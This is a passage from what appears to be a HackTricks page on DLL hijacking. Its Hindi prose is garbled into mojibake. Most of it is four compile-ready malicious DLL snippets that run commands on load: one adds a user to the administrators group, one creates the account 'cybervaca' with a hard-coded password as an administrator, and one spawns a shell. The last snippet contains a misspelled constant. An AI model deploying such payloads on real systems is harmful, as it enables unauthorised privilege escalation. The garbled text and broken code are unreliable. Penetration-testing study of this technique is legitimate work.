### рдЕрдкрдирд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╡рд╣ Dll рдЬрд┐рд╕реЗ рдЖрдк рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддреЗ рд╣реИрдВ, **рдХрдИ рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░реНрдпрд╛рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП** рдЬреЛ рдкреАрдбрд╝рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ, рдпрджрд┐ рдпреЗ рдлрд╝рдВрдХреНрд╢рди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИрдВ рддреЛ **рдмрд╛рдЗрдирд░реА рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧреА** рдФрд░ **рдЙрддреНрдкреАрдбрд╝рди рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛**ред
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## рд╕рдВрджрд░реНрдн
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрдирд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрд┐рдд рдФрд░ рдмреЛрд▓реА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ **рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
